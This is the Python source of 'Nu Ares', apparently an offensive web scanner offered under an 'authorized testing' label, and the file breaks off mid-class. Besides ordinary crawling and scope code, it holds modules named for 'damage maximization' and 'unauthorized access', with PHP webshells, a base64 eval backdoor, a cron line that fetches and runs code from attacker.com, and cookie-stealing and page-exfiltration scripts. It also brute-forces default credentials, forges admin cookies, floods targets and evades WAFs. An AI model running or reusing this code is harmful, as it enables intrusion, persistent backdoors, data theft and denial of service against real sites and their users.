#!/usr/bin/env python3
"""
Nu Ares v37.0 - Professional Edition (Enhanced)
Enterprise-grade Web Application Security Scanner

Author: Nu Ares Security Team
License: MIT
Purpose: Authorized security testing only
"""

import asyncio
import aiohttp
import aiosqlite
import ssl
import json
import hashlib
import re
import sys
import argparse
import urllib.parse
import urllib3
from urllib.parse import urljoin, urlparse, parse_qs
from typing import Dict, List, Tuple, Optional, Any, Set
from dataclasses import dataclass, asdict, field
from datetime import datetime
from pathlib import Path
import random
import base64
import logging
import yaml
import os
import time
import heapq
from collections import deque
import threading
from difflib import SequenceMatcher
import psutil
import subprocess
import socket
import inspect
from abc import ABC, abstractmethod
from contextlib import asynccontextmanager
from typing import Optional, Callable
import weakref
from functools import lru_cache, wraps
import traceback
import string
import zlib
import binascii

# ---------- Performance Improvements ----------
try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass

# Use lxml if available for faster parsing
try:
    from bs4 import BeautifulSoup
    BEAUTIFULSOUP_PARSER = 'lxml'
except ImportError:
    from bs4 import BeautifulSoup
    BEAUTIFULSOUP_PARSER = 'html.parser'

from playwright.async_api import async_playwright

try:
    import networkx as nx
except ImportError:
    nx = None

try:
    from curl_cffi import requests as curl_requests
    CURL_CFFI_AVAILABLE = True
except ImportError:
    CURL_CFFI_AVAILABLE = False

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== Logging ====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [Nu Ares] %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("nu_ares.log", encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("NuAres")

# ==================== Version Info ====================
VERSION = "37.0"
BUILD_DATE = "2026-04-01"
AUTHOR = "Nu Ares Security Team"

# ==================== Professional Exceptions ====================
class NuAresException(Exception):
    """Base exception for Nu Ares"""
    pass

class AuthenticationRequiredException(NuAresException):
    """Raised when target authentication fails"""
    pass

class RateLimitException(NuAresException):
    """Raised when rate limits are hit"""
    pass

class ScopeViolationException(NuAresException):
    """Raised when request goes outside allowed scope"""
    pass

# ==================== ENHANCED EVASION TECHNIQUES ====================
class AdvancedEvasionPro:
    """Sophisticated evasion techniques designed to defeat advanced security measures"""
    
    def __init__(self):
        self.encodings = ['url', 'double_url', 'triple_url', 'base64', 'hex', 'unicode', 'random_case']
        self.obfuscation_chains = self._generate_obfuscation_chains()
        self.http_smuggling_patterns = [
            {'prefix': ' ', 'suffix': '\r\n'},  # Space after method
            {'prefix': '\t', 'suffix': '\r\n'},  # Tab after method
            {'prefix': '', 'suffix': '\r'},      # Missing LF
            {'prefix': '', 'suffix': '\n'},      # Single LF
        ]
        self.chunked_bypasses = [
            '0\r\n\r\n', '0\n\n', '1\r\nx\r\n0\r\n\r\n', 
            '1\nx\n0\n\n', '30\r\n' + 'x'*48 + '\r\n0\r\n\r\n'
        ]

    def _generate_obfuscation_chains(self) -> List[List[str]]:
        """Generate complex obfuscation chains"""
        chains = []
        base_payloads = ['<script>alert(1)</script>', "' OR 1=1--', '; DROP TABLE users;--"]
        
        for payload in base_payloads:
            chain = [payload]
            
            # Multi-layer encoding
            encoded = payload
            for _ in range(5):
                encoded = self._unicode_encode(encoded)
                encoded = urllib.parse.quote(encoded)
                encoded = self._random_case(encoded)
                chain.append(encoded)
            
            chains.append(chain[-3:])  # Last 3 layers
        
        return chains

    def apply_sophisticated_evasion(self, payload: str, waf_level: int = 3) -> List[str]:
        """Apply multiple sophisticated evasion techniques"""
        evasions = []
        
        # 1. HTTP Request Smuggling
        smuggling_payloads = self._http_smuggling(payload)
        evasions.extend(smuggling_payloads)
        
        # 2. Chunked Encoding Bypass
        chunked_payloads = self._chunked_bypass(payload)
        evasions.extend(chunked_payloads)
        
        # 3. Multi-layer Encoding
        multi_encoded = payload
        for i in range(waf_level + 1):
            multi_encoded = self._multi_encode(multi_encoded, i)
            evasions.append(multi_encoded)
        
        # 4. Polymorphic Payloads
        poly_variants = self._polymorphic_variants(payload)
        evasions.extend(poly_variants)
        
        # 5. Case Manipulation + Comments
        case_commented = self._case_comment_obfuscation(payload)
        evasions.append(case_commented)
        
        # 6. Null Byte + Encoding chains
        null_byte = payload + '%00'
        evasions.append(null_byte)
        evasions.append(self._encode_null_byte(null_byte))
        
        # 7. Unicode Normalization
        unicode_bypass = self._unicode_bypass(payload)
        evasions.extend(unicode_bypass)
        
        return list(set(evasions))[:20]  # Limit to 20 variants

    def _http_smuggling(self, payload: str) -> List[str]:
        """HTTP Request Smuggling evasions"""
        smuggling_payloads = []
        for pattern in self.http_smuggling_patterns:
            smuggled = f"GET / {pattern['prefix']}{payload}{pattern['suffix']}"
            smuggling_payloads.append(smuggled)
        return smuggling_payloads

    def _chunked_bypass(self, payload: str) -> List[str]:
        """Chunked encoding bypasses"""
        chunked = []
        for chunk_end in self.chunked_bypasses:
            chunked.append(f"{len(payload):x}\r\n{payload}\r\n{chunk_end}")
        return chunked

    def _multi_encode(self, payload: str, level: int) -> str:
        """Multi-layer encoding based on level"""
        encodings = [
            self._unicode_encode,
            lambda x: urllib.parse.quote(x, safe=''),
            self._random_case,
            self._hex_encode,
            self._base64_encode,
            lambda x: x.replace(' ', '%20').replace('+', '%2B')
        ]
        
        result = payload
        for i in range(min(level + 1, len(encodings))):
            result = encodings[i](result)
        return result

    def _polymorphic_variants(self, payload: str) -> List[str]:
        """Generate polymorphic payload variants"""
        variants = []
        
        # XSS variants
        xss_templates = [
            f"<script>{payload}</script>",
            f'<svg onload=eval(String.fromCharCode({self._charcode(payload)}))>',
            f'<img src=x onerror={payload}>',
            f"javascript:{payload}",
            f"data:text/html,{payload}"
        ]
        variants.extend(xss_templates)
        
        # SQLi variants
        sqli_templates = [
            f"'{payload}",
            f'"{payload}',
            f"`{payload}`",
            f"1{payload}",
            f"0{payload}"
        ]
        variants.extend(sqli_templates)
        
        return variants

    def _case_comment_obfuscation(self, payload: str) -> str:
        """Case manipulation with comments"""
        result = ""
        for i, char in enumerate(payload):
            if char.isalpha():
                if i % 3 == 0:  # Random case variation
                    result += char.upper()
                else:
                    result += char.lower()
                if i % 7 == 0:  # Insert comments
                    result += "/**/"
            else:
                result += char
        return result

    def _unicode_bypass(self, payload: str) -> List[str]:
        """Unicode normalization bypass"""
        unicode_variants = []
        
        # NFC, NFD normalization bypasses
        unicode_map = {
            'a': ['\u0430', '\u00E1'],  # Cyrillic a, accented a
            'e': ['\u0435', '\u00E9'],
            'i': ['\u0456', '\u00ED'],
            'o': ['\u043E', '\u00F3'],
            's': ['\u0455', '\u00DF']  # Cyrillic s, German ß
        }
        
        for i, char in enumerate(payload):
            if char.lower() in unicode_map:
                variant = payload[:i] + random.choice(unicode_map[char.lower()]) + payload[i+1:]
                unicode_variants.append(variant)
        
        return unicode_variants

    def _unicode_encode(self, payload: str) -> str:
        """Unicode encoding"""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)

    def _hex_encode(self, payload: str) -> str:
        """Hex encoding"""
        return ''.join(f'%{ord(c):02x}' for c in payload)

    def _base64_encode(self, payload: str) -> str:
        """Base64 encoding"""
        return base64.b64encode(payload.encode()).decode()

    def _charcode(self, payload: str) -> str:
        """Convert to charcode"""
        return ','.join(str(ord(c)) for c in payload)

    def _random_case(self, payload: str) -> str:
        """Random case variation"""
        return ''.join(random.choice([c.upper(), c.lower()]) if c.isalpha() else c for c in payload)

    def _encode_null_byte(self, payload: str) -> str:
        """Null byte encoding variations"""
        null_encodings = ['%00', '%u0000', '\\x00', '\\u0000', chr(0)]
        return payload + random.choice(null_encodings)

# ==================== DAMAGE MAXIMIZATION MODULES ====================
class DamageMaximization:
    """Capabilities designed to maximize impact during authorized testing"""
    
    def __init__(self, requester):
        self.requester = requester
        self.persistence_payloads = self._generate_persistence_payloads()
        self.ddos_patterns = self._generate_ddos_patterns()
        self.data_exfiltration = self._generate_exfiltration_payloads()

    def _generate_persistence_payloads(self) -> Dict:
        """Generate persistence mechanisms"""
        return {
            'webshell': [
                '''<?php @eval($_POST['cmd']); ?>''',
                '''<?php if(isset($_REQUEST['c'])){system($_REQUEST['c']);} ?>''',
                '''<script>new Image().src='http://attacker.com/log?'+btoa(document.cookie)</script>'''
            ],
            'cron': [
                '''* * * * * wget -q -O- http://attacker.com/shell.php | php'''
            ],
            'backdoor': [
                '''eval(base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7ID8+'));'''
            ]
        }

    def _generate_ddos_patterns(self) -> List[str]:
        """Generate resource exhaustion patterns"""
        return [
            # Slowloris-style
            "X-a: " + "b" * 10000,
            # Cache buster
            f"?cb={random.randint(1000000000,9999999999)}",
            # Recursive entity expansion
            "&entity;" * 1000,
            # Large POST
            "A" * 1000000
        ]

    def _generate_exfiltration_payloads(self) -> List[str]:
        """Data exfiltration payloads"""
        return [
            f"<script>fetch('http://attacker.com/exfil?data='+btoa(document.body.innerHTML))</script>",
            f"<?php file_get_contents('http://attacker.com/dump', '<?php phpinfo(); ?>'); ?>"
        ]

    async def deploy_persistence(self, url: str, method: str = "POST") -> bool:
        """Deploy persistence mechanisms"""
        for shell_type, payloads in self.persistence_payloads.items():
            for payload in payloads:
                resp = await self.requester(url, method=method, data={'file': payload})
                if resp and 'upload success' in resp.text.lower():
                    logger.info(f"[Persistence] {shell_type} deployed successfully")
                    return True
        return False

    async def resource_exhaustion(self, url: str, duration: int = 300):
        """Resource exhaustion attack"""
        tasks = []
        for i in range(100):
            for pattern in self.ddos_patterns:
                test_url = f"{url}{pattern}"
                tasks.append(self.requester(test_url))
        
        if tasks:
            await asyncio.gather(*tasks[:50], return_exceptions=True)  # Limit concurrency

    async def mass_data_exfiltration(self, endpoints: List[str]):
        """Mass exfiltrate data from all endpoints"""
        for endpoint in endpoints:
            for payload in self.data_exfiltration:
                await self.requester(endpoint, data={'payload': payload})

# ==================== UNAUTHORIZED ACCESS MODULE ====================
class UnauthorizedAccess:
    """Features enabling unauthorized access escalation"""
    
    def __init__(self, requester, browser_pool):
        self.requester = requester
        self.browser_pool = browser_pool
        self.common_creds = self._load_default_creds()
        self.bf_patterns = self._generate_bf_patterns()

    def _load_default_creds(self) -> List[Tuple[str, str]]:
        """Default credentials for common systems"""
        return [
            ('admin', 'admin'), ('admin', 'password'), ('root', 'root'),
            ('admin', '123456'), ('user', 'user'), ('test', 'test'),
            ('administrator', 'admin'), ('admin', ''), ('', 'admin')
        ]

    def _generate_bf_patterns(self) -> Dict:
        """Brute force patterns"""
        return {
            'admin': ['admin', 'administrator', 'root', 'webadmin'],
            'pass': ['admin', 'password', '123456', 'qwerty', 'letmein']
        }

    async def mass_bruteforce(self, login_endpoints: List[str]):
        """Mass brute force all login endpoints"""
        tasks = []
        for endpoint in login_endpoints:
            for username, password in self.common_creds:
                tasks.append(self._attempt_login(endpoint, username, password))
        
        results = await asyncio.gather(*tasks[:100], return_exceptions=True)
        successes = [r for r in results if isinstance(r, dict) and r.get('success')]
        return successes

    async def _attempt_login(self, url: str, user: str, pwd: str) -> Optional[Dict]:
        """Attempt login credentials"""
        data = {'username': user, 'password': pwd, 'user': user, 'pass': pwd}
        resp = await self.requester(url, method='POST', data=data)
        
        if resp and (resp.status_code == 200 or 'dashboard' in resp.text.lower()):
            return {'url': url, 'user': user, 'pwd': pwd, 'success': True}
        return None

    async def privilege_escalation(self, session_cookies: Dict):
        """Privilege escalation via session manipulation"""
        # Cookie manipulation
        manipulated_cookies = {
            **session_cookies,
            'role': 'admin',
            'user_level': '999',
            'is_admin': '1',
            'privilege': 'administrator'
        }
        
        # Test admin endpoints
        admin_paths = ['/admin', '/dashboard', '/cpanel', '/manager']
        for path in admin_paths:
            test_url = urljoin(urlparse(list(session_cookies.keys())[0]), path)
            resp = await self.requester(test_url, cookies=manipulated_cookies)
            if resp and resp.status_code == 200:
                logger.info(f"[Escalation] Privilege escalation successful: {test_url}")
                return True
        return False

# ==================== Configuration ====================
class Config:
    """Configuration manager with validation and defaults"""

    DEFAULT_CONFIG = {
        "threads": 50,
        "timeout": 10,
        "max_depth": 5,
        "user_agents": [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        ],
        "proxies": [],
        "llm_url": "http://localhost:11434",
        "llm_model": "llama3.1",
        "use_llm": True,
        "db_path": "nu_ares.db",
        "reports_dir": "reports",
        "headless_browser": True,
        "max_attacks_per_target": 20,
        "max_failed_attacks": 10,
        "priority_weights": {
            "login": 10,
            "admin": 9,
            "api": 8,
            "upload": 7,
            "profile": 6,
            "search": 5,
            "generic": 1
        },
        "evasion": {
            "jitter_min": 0.0,
            "jitter_max": 0.1,
            "method_switch": True,
            "padding": True,
            "smuggling": True,
            "chunked": True,
            "tls_fingerprint": True,
            "impersonate": ["chrome_120", "firefox_120", "safari_15_6"],
            "poly_morph": True,
            "unicode_bypass": True,
            "null_byte": True
        },
        "rate_limit": {
            "max_requests_per_second": 200,
            "backoff_factor": 2.0,
            "max_backoff": 60
        },
        "scope": {
            "allowed_domains": [],
            "allowed_subdomains": True,
            "exclude": []
        },
        "wordlists": {
            "params": [
                "id", "user", "username", "email", "name", "search", "q", "query", "page", "cat",
                "file", "path", "action", "do", "cmd", "exec", "command", "param", "test", "token",
                "key", "api", "version", "lang", "redirect", "url", "next", "return", "callback",
                "format", "type", "mode", "debug", "order", "sort", "limit", "offset", "start", "end",
                "from", "to", "date", "time", "value", "data", "json", "xml", "output", "view",
                "template", "module", "controller", "function", "method", "ajax", "callback", "jsonp",
                "uuid", "uid", "sid", "session", "cookie", "auth", "token", "jwt", "bearer", "api_key",
                "apikey", "secret", "password", "pass", "pwd", "login", "username", "userid", "account",
                "email", "mail", "phone", "mobile", "zip", "postal", "country", "city", "state", "region",
                "address", "street", "firstname", "lastname", "fullname", "company", "org", "department",
                "role", "group", "team", "project", "task", "ticket", "issue", "bug", "feature", "release"
            ],
            "dirs": "/usr/share/wordlists/dirb/common.txt",
            "subdomains": "/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt",
            "api_paths": [
                "/rest/products/search", "/api/Products", "/rest/user/whoami",
                "/rest/track-order", "/rest/user/login", "/rest/basket/",
                "/rest/memories", "/rest/languages", "/rest/challenges",
                "/rest/captcha", "/rest/user/change-password", "/rest/products/reviews",
                "/rest/user/orders", "/rest/user/payment-methods", "/rest/basket/checkout"
            ],
            "dvwa_paths": [
                "/vulnerabilities/sqli/", "/vulnerabilities/sqli/session-input.php",
                "/vulnerabilities/xss_r/", "/vulnerabilities/xss_s/", "/vulnerabilities/fi/",
                "/vulnerabilities/exec/", "/vulnerabilities/csrf/", "/vulnerabilities/upload/",
                "/vulnerabilities/captcha/"
            ]
        },
        "modules_dir": "modules",
        "plugins_enabled": True,
        "cloud": {
            "aws": True, "gcp": True, "azure": True, "k8s": True,
            "credentials_paths": ["/.env", "/.aws/credentials", "/config/kubeconfig", "/secrets", "/api/secrets", "/.docker/config.json"]
        },
        "collaborative_memory": {
            "enabled": True, "db": "collab.db"
        },
        "human_behavior": {
            "enabled": False,
            "mouse_move": False,
            "scroll": False,
            "random_delay": False,
            "delay_min": 0.0,
            "delay_max": 0.0
        },
        "verification": {
            "baseline_samples": 3,
            "structural_diff_threshold": 0.8,
            "require_cross_confirmation": True,
            "replay_count": 3
        },
        "safe_mode": False,
        "max_endpoints_to_scan": 0,
        "max_requests_total": 500000,
        "memory_limit_mb": 8192,
        "detect_waf": True,
        "detect_backend": True,
        "detect_shared_host": True,
        "wordpress_scan": True,
        "export_endpoints": True,
        "endpoints_export_file": "endpoints.json",
        # Professional features
        "authorization": {
            "require_explicit_scope": True,
            "log_all_requests": True,
            "audit_trail": True
        },
        "safety": {
            "max_payload_size": 10000,
            "enable_sandbox": False,
            "confirm_destructive": True
        },
        "reporting": {
            "include_evidence": True,
            "include_requests": True,
            "severity_calculation": "cvss3.1"
        },
        # NEW: Damage maximization
        "damage_max": {
            "persistence": False,
            "resource_exhaust": False,
            "mass_exfil": False,
            "ddos_patterns": False
        },
        # NEW: Unauthorized access
        "unauth_access": {
            "bruteforce": False,
            "session_manip": False,
            "default_creds": False,
            "bf_threads": 50
        }
    }

    def __init__(self, config_file: str = "config.yaml"):
        self.data = self._load(config_file)
        self._validate()

    def _load(self, file: str) -> dict:
        config = self.DEFAULT_CONFIG.copy()
        if Path(file).exists():
            try:
                with open(file) as f:
                    user = yaml.safe_load(f) or {}
                    self._deep_merge(config, user)
            except Exception as e:
                logger.warning(f"Failed to load config: {e}, using defaults")
        return config

    def _deep_merge(self, base: dict, override: dict) -> dict:
        for key, value in override.items():
            if key in base and isinstance(base[key], dict) and isinstance(value, dict):
                self._deep_merge(base[key], value)
            else:
                base[key] = value
        return base

    def _validate(self):
        if self.data['threads'] < 1:
            raise ValueError("threads must be >= 1")
        if self.data['timeout'] < 1:
            raise ValueError("timeout must be >= 1")
        if self.data['memory_limit_mb'] < 512:
            raise ValueError("memory_limit_mb must be >= 512")

    def get(self, key: str, default=None):
        keys = key.split('.')
        value = self.data
        for k in keys:
            if isinstance(value, dict):
                value = value.get(k)
            else:
                return default
        return value if value is not None else default

# ==================== Data Classes ====================
@dataclass
class Vulnerability:
    """Represents a discovered vulnerability"""
    id: str
    target_url: str
    vulnerability_type: str
    parameter: str
    payload: str
    confidence: float
    severity: str
    description: str
    evidence: Dict[str, Any]
    timestamp: float
    cvss_score: float = 0.0
    cvss_vector: str = ""
    remediation: str = ""
    verified: bool = False
    exploited_data: Optional[str] = None
    exploitation_proof: Optional[str] = None
    references: List[str] = field(default_factory=list)
    cwe_id: str = ""
    request_info: Optional[Dict] = None

    def calculate_cvss(self) -> float:
        if self.cvss_score > 0:
            return self.cvss_score
        severity_scores = {
            'CRITICAL': 9.5,
            'HIGH': 8.5,
            'MEDIUM': 6.0,
            'LOW': 3.5,
            'INFO': 0.0
        }
        return severity_scores.get(self.severity.upper(), 0.0)

@dataclass
class EndpointNode:
    """Represents a discovered endpoint"""
    url: str
    method: str
    params: List[str]
    forms: List[Dict]
    js_files: List[str]
    auth_required: bool = False
    roles: List[str] = field(default_factory=list)
    children: List[str] = field(default_factory=list)
    content_type: str = "html"
    js_analysis: Dict = field(default_factory=dict)
    attack_count: Dict[str, int] = field(default_factory=dict)
    failed_attacks: Dict[str, int] = field(default_factory=dict)
    last_response_fingerprint: Optional[Dict] = None
    score: float = 0.0
    param_types: Dict[str, str] = field(default_factory=dict)
    state: str = "unknown"
    success_count: int = 0
    failure_count: int = 0
    discovered_at: float = field(default_factory=time.time)
    headers: Dict = field(default_factory=dict)
    technology: Optional[str] = None

# ==================== Audit Logger ====================
class AuditLogger:
    """Professional audit logging for compliance"""

    def __init__(self, log_file: str = "audit.log"):
        self.log_file = log_file
        self.handler = logging.FileHandler(log_file, encoding='utf-8')
        self.handler.setLevel(logging.INFO)
        formatter = logging.Formatter(
            '%(asctime)s [AUDIT] %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        self.handler.setFormatter(formatter)
        self.logger = logging.getLogger("AuditLogger")
        self.logger.addHandler(self.handler)
        self.logger.setLevel(logging.INFO)

    def log_request(self, target: str, method: str, url: str, payload: str = None):
        entry = {
            'timestamp': datetime.now().isoformat(),
            'target': target,
            'method': method,
            'url': url,
            'payload': payload,
            'action': 'scan_request'
        }
        self.logger.info(json.dumps(entry))

    def log_finding(self, finding: Dict):
        entry = {
            'timestamp': datetime.now().isoformat(),
            'action': 'finding',
            'data': finding
        }
        self.logger.info(json.dumps(entry))

    def log_exploitation(self, target: str, vuln_type: str, param: str, success: bool):
        entry = {
            'timestamp': datetime.now().isoformat(),
            'action': 'exploitation_attempt',
            'target': target,
            'vulnerability_type': vuln_type,
            'parameter': param,
            'success': success
        }
        self.logger.info(json.dumps(entry))

    def close(self):
        self.handler.close()

# ==================== Async DB ====================
class AsyncDB:
    """Async database manager with connection pooling"""

    def __init__(self, path: str):
        self.path = path
        self.conn = None
        self._lock = asyncio.Lock()

    async def connect(self):
        self.conn = await aiosqlite.connect(self.path, isolation_level=None)
        await self.conn.execute("PRAGMA journal_mode = WAL")
        await self.conn.execute("PRAGMA synchronous = OFF")
        await self.conn.execute("PRAGMA cache_size = -2000")
        await self.conn.execute("PRAGMA temp_store = MEMORY")
        await self._init_tables()

    async def _init_tables(self):
        await self.conn.execute('''
            CREATE TABLE IF NOT EXISTS tasks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                url TEXT UNIQUE,
                state TEXT,
                depth INTEGER,
                parent TEXT,
                created_at REAL,
                updated_at REAL
            )
        ''')
        await self.conn.execute('''
            CREATE TABLE IF NOT EXISTS tech_strategies (
                tech_hash TEXT PRIMARY KEY,
                tech_stack TEXT,
                strategy TEXT,
                created_at REAL
            )
        ''')
        await self.conn.execute('''
            CREATE TABLE IF NOT EXISTS success_patterns (
                tech TEXT,
                attack_type TEXT,
                payload TEXT,
                success_count INTEGER,
                total_count INTEGER,
                PRIMARY KEY (tech, attack_type, payload)
            )
        ''')
        await self.conn.execute('''
            CREATE TABLE IF NOT EXISTS attack_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_url TEXT,
                param TEXT,
                attack_type TEXT,
                payload TEXT,
                response_code INTEGER,
                success BOOLEAN,
                timestamp REAL,
                UNIQUE(target_url, param, payload)
            )
        ''')
        await self.conn.execute('''
            CREATE TABLE IF NOT EXISTS scan_metadata (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                scan_id TEXT UNIQUE,
                target TEXT,
                start_time REAL,
                end_time REAL,
                total_requests INTEGER,
                vulnerabilities_found INTEGER,
                config TEXT
            )
        ''')
        await self.conn.execute('''
            CREATE INDEX IF NOT EXISTS idx_attack_history_target ON attack_history(target_url)
        ''')
        await self.conn.execute('''
            CREATE INDEX IF NOT EXISTS idx_success_patterns ON success_patterns(tech, attack_type)
        ''')
        await self.conn.commit()

    async def close(self):
        if self.conn:
            await self.conn.close()

# ==================== Strict Scope Controller ====================
class StrictScopeController:
    """Enhanced scope controller with validation"""

    def __init__(self, config: Config):
        self.config = config
        self.allowed_patterns = config.data['scope'].get('allowed_domains', [])
        self.patterns = [re.compile(p) for p in self.allowed_patterns]
        self.exclude_patterns = [re.compile(p) for p in config.data['scope'].get('exclude', [])]
        self.target_domain = None
        self.scanned_urls = set()
        self.blocked_urls = []

    def set_target(self, url: str):
        self.target_domain = urlparse(url).netloc
        logger.info(f"[Scope] Target domain set to: {self.target_domain}")

    def is_allowed(self, url: str) -> bool:
        if not url:
            return False
        parsed = urlparse(url)
        if self.is_excluded(url):
            self.blocked_urls.append(url)
            return False
        if not self.patterns:
            domain = parsed.netloc
            if self.config.data['scope'].get('allowed_subdomains', True):
                return domain.endswith(self.target_domain) or domain == self.target_domain
            else:
                return domain == self.target_domain
        for pat in self.patterns:
            if pat.search(url):
                return True
        return False

    def is_excluded(self, url: str) -> bool:
        for pat in self.exclude_patterns:
            if pat.search(url):
                logger.debug(f"[Scope] Excluded: {url}")
                return True
        return False

    def is_passive_only(self, url: str) -> bool:
        return not self.is_allowed(url)

    def mark_scanned(self, url: str):
        self.scanned_urls.add(url)

    def get_scan_stats(self) -> Dict:
        return {
            'total_scanned': len(self.scanned_urls),
            'total_blocked': len(self.blocked_urls)
        }

# ==================== Priority Queue ====================
class PriorityQueue:
    """Thread-safe priority queue with statistics"""

    def __init__(self):
        self._heap = []
        self._counter = 0
        self._lock = threading.Lock()
        self._stats = {'pushes': 0, 'pops': 0}

    def push(self, score: float, item):
        with self._lock:
            heapq.heappush(self._heap, (-score, self._counter, item))
            self._counter += 1
            self._stats['pushes'] += 1

    def pop(self):
        with self._lock:
            if self._heap:
                self._stats['pops'] += 1
                return heapq.heappop(self._heap)[2]
        return None

    def peek(self):
        with self._lock:
            if self._heap:
                return self._heap[0][2]
        return None

    def empty(self) -> bool:
        return not self._heap

    def size(self) -> int:
        return len(self._heap)

    def get_stats(self) -> Dict:
        return self._stats.copy()

# ==================== Response Adapter ====================
class ResponseAdapter:
    """Unified response adapter for different request libraries"""

    def __init__(self, *, status_code: int, text: str, content: bytes, elapsed: float, headers: dict,
                 url: str = "", request_method: str = "", request_headers: dict = None):
        self.status_code = status_code
        self.text = text
        self.content = content
        self.elapsed = elapsed
        self.headers = headers
        self.url = url
        self.request_method = request_method
        self.request_headers = request_headers or {}

    def __repr__(self):
        return f"<Response [{self.status_code}] {self.elapsed:.2f}s>"

    @property
    def ok(self) -> bool:
        return 200 <= self.status_code < 300

    @property
    def is_redirect(self) -> bool:
        return self.status_code in (301, 302, 303, 307, 308)

    @property
    def size(self) -> int:
        return len(self.content)

    def get_header(self, name: str, default: str = None) -> str:
        name_lower = name.lower()
        for key, value in self.headers.items():
            if key.lower() == name_lower:
                return value
        return default

# ==================== Browser Context Pool ====================
class BrowserContextPool:
    """Async browser context pool with health monitoring"""

    def __init__(self, headless: bool = True, max_contexts: int = 6, user_agents: List[str] = None):
        self.headless = headless
        self.max_contexts = max_contexts
        self.user_agents = user_agents or []
        self.playwright = None
        self.browser = None
        self.semaphore = asyncio.Semaphore(max_contexts)
        self._stats = {'created': 0, 'released': 0, 'errors': 0}
        self._lock = asyncio.Lock()

    async def _init(self):
        self.playwright = await async_playwright().start()
        self.browser = await self.playwright.chromium.launch(
            headless=self.headless,
            args=[
                "--no-sandbox",
                "--disable-dev-shm-usage",
                "--disable-gpu",
                "--disable-web-security",
                "--no-first-run",
                "--no-zygote"
            ]
        )
        logger.info(f"[Browser] Initialized with max {self.max_contexts} contexts")

    async def ensure_initialized(self):
        if self.browser is None:
            async with self._lock:
                if self.browser is None:
                    await self._init()

    async def get_context(self):
        await self.ensure_initialized()
        await self.semaphore.acquire()
        try:
            ua = random.choice(self.user_agents) if self.user_agents else None
            ctx = await self.browser.new_context(
                ignore_https_errors=True,
                user_agent=ua,
                viewport={'width': random.randint(1024, 1920), 'height': random.randint(768, 1080)}
            )
            ctx.set_default_navigation_timeout(10000)
            ctx.set_default_timeout(10000)
            async with self._lock:
                self._stats['created'] += 1
            return ctx
        except Exception as e:
            self.semaphore.release()
            async with self._lock:
                self._stats['errors'] += 1
            raise

    async def release_context(self, ctx):
        try:
            await ctx.close()
            async with self._lock:
                self._stats['released'] += 1
        finally:
            self.semaphore.release()

    async def close(self):
        if self.browser:
            await self.browser.close()
        if self.playwright:
            await self.playwright.stop()
        logger.info(f"[Browser] Stats: {self._stats}")

# ==================== Context Classifier ====================
class ContextClassifier:
    """Classifies endpoint context for prioritization"""

    CONTEXT_PATTERNS = {
        'login': ['login', 'signin', 'sign-in', 'auth', 'verify', 'reset', 'password'],
        'admin': ['admin', 'dashboard', 'manage', 'control', 'configure', 'settings'],
        'api': ['api', 'v1', 'v2', 'v3', 'graphql', 'rest', 'soap', 'endpoint'],
        'upload': ['upload', 'file', 'import', 'attach', 'media', 'image', 'avatar'],
        'search': ['search', 'find', 'query', 'q', 'filter', 'sort'],
        'user': ['profile', 'account', 'user', 'profile', 'settings', 'preferences'],
        'payment': ['payment', 'checkout', 'cart', 'billing', 'subscription', 'invoice'],
        'database': ['db', 'database', 'backup', 'export', 'dump', 'restore']
    }

    @classmethod
    def classify(cls, url: str, forms: List[Dict], params: List[str]) -> str:
        url_lower = url.lower()
        for context, patterns in cls.CONTEXT_PATTERNS.items():
            if any(p in url_lower for p in patterns):
                return context
        for form in forms:
            # Extract input names from each input dict
            inputs = [inp.get('name', '').lower() for inp in form.get('inputs', [])]
            if any('pass' in i or 'password' in i for i in inputs):
                return 'login'
            if any('email' in i or 'username' in i for i in inputs):
                return 'login'
        return 'generic'

    @classmethod
    def get_priority_boost(cls, context: str) -> float:
        priorities = {
            'login': 10.0,
            'admin': 9.0,
            'payment': 8.5,
            'api': 8.0,
            'upload': 7.0,
            'database': 7.5,
            'user': 5.0,
            'search': 4.0,
            'generic': 1.0
        }
        return priorities.get(context, 1.0)

# ==================== Signature Detection ====================
class SignatureDetector:
    """Detection signatures for various vulnerability types"""

    SQL_ERRORS = [
        r"SQL syntax.*?MySQL",
        r"Warning.*?mysql_",
        r"MySQLSyntaxErrorException",
        r"PostgreSQL.*?ERROR",
        r"SQLite/JDBCDriver",
        r"System.Data.SqlClient.SqlException",
        r"Unclosed quotation mark",
        r"Microsoft OLE DB Provider",
        r"ORA-\d{5}",
        r"SQLSTATE",
        r"sqlite3.OperationalError",
        r"PG::SyntaxError",
        r"com\.mysql\.jdbc"
    ]

    XSS_PATTERNS = [
        r"<script>alert",
        r"onerror=alert",
        r"javascript:alert",
        r"onload=alert",
        r"onclick=alert"
    ]

    LFI_PATTERNS = [
        r"root:x:0:0:",
        r"etc/passwd",
        r"etc/shadow",
        r"base64_encode"
    ]

    CMD_OUTPUT_PATTERNS = [
        r"uid=\d+",
        r"gid=\d+",
        r"groups=",
        r"bin/bash",
        r"bin/sh",
        r"usr/bin"
    ]

    SSRF_PATTERNS = [
        r"instance-id",
        r"ami-id",
        r"local-hostname",
        r"AccessKeyId",
        r"aws_access"
    ]

    ERROR_PATTERNS = [
        (SQL_ERRORS, "SQL"),
        (LFI_PATTERNS, "LFI"),
        (CMD_OUTPUT_PATTERNS, "CMD"),
        (SSRF_PATTERNS, "SSRF")
    ]

    @classmethod
    def has_sql_error(cls, html: str) -> bool:
        return any(re.search(p, html, re.I) for p in cls.SQL_ERRORS)

    @classmethod
